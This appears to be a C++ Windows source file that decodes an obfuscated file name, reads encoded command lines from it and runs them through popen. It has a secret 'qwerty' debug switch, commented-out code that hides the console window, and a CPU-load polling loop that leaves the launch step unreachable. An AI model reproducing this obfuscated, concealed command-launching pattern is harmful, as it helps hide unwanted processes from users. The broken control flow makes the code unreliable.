#include <iostream>
#include <string>
#include <sstream>
#include <stdexcept>
#include <fstream>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

const int& CPUsage (void);

/*
 */
BOOL WINAPI CTRL_C (DWORD sig) {
if (sig == CTRL_C_EVENT)
    throw runtime_error("OK, stop it");
return TRUE;
}

/*
 */
int main (int argc, char** argv
) {
static  STARTUPINFO si;
static  PROCESS_INFORMATION pi;
static  SYSTEM_INFO sysinfo;
try {

SetConsoleCtrlHandler(CTRL_C, TRUE);

static bool cfg = false;
    if (argc > 1) {
        string arg(argv[1]);
        if (arg == "qwerty") cfg = true;
    }

//    if (!cfg) ShowWindow( GetConsoleWindow(), SW_HIDE );

static hide::line name("0xod03RjfkAFpNZFPfN4BfFJLa1UeUV/BaD+djy8TSb5kGQ=");
    name.decode();
    if (cfg) cout << name << endl;
    ifstream  ini( name.c_str(), ios::in); 
    if ( !ini.is_open()) throw runtime_error("file not open");

static hide::line arg, cmd;
while ( getline(ini, arg)) {
    arg.decode();
    if (cfg) cout << arg << endl;
    else
        cmd.append(arg);
}
if (cfg) throw runtime_error("<<<<<<<<<< eof >>>>>>>>>>>>");

/*
GetSystemInfo(&sysinfo);
DWORD num = sysinfo.dwNumberOfProcessors;
cout << "CPU:" << num << endl;
throw runtime_error("---");
*/
while (1) { 
    cout << CPUsage() << endl;
    sleep(1);
}

static char buff[1024];

FILE* game = popen(cmd.c_str(), "r"); 
if(!game)
    throw runtime_error("Game not popen");

while( fgets(buff, sizeof(buff), game)!=NULL) {
    cout << buff << endl;
}
pclose(game);
/*
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
//  si.dwFlags = STARTF_USESHOWWINDOW;
//  si.wShowWindow = SW_HIDE;
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcess ( NULL,   // No module name (use command line)
        (LPSTR)cmd.c_str(),  // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,  
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
    )
     throw new runtime_error("create process fail");

 //   WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
*/
    return 0;
} catch (const exception& e) {
    cerr << e.what() << endl;
    return 1;
}}

/*
 *
 */
const int& CPUsage (void)
{
static string percent;
static char buff[16];
FILE* pipe = popen("wmic cpu get loadpercentage", "r"); 
if(!pipe)
    throw runtime_error("wmic fail");
while( fgets(buff, sizeof(buff), pipe)!=NULL) {
    percent = buff;
if ( isdigit( *percent.begin()) )
    break;
}
pclose(pipe);

static int per;
istringstream sper(percent); sper >> per;
return per;
}
